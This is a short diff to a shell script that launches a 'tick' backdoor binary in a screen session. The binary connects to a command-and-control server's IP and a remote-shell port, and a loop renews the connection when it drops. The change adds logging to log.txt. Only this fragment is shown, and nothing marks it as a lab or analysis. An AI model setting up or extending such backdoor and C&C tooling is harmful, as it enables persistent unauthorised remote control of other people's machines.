@@ -62,7 +62,7 @@ python listen_for_changes.py &
 SOCKET_PID=$!
 
 # start listening for C&C server
-screen -S tick $tick_backdoor_folder/bin/ticksvc $ip_of_server $port_of_remote_shell
+screen -S tick -L -Logfile "log.txt" $tick_backdoor_folder/bin/ticksvc $ip_of_server $port_of_remote_shell 
 
 # renew connection to prevent crashes
 while true; do
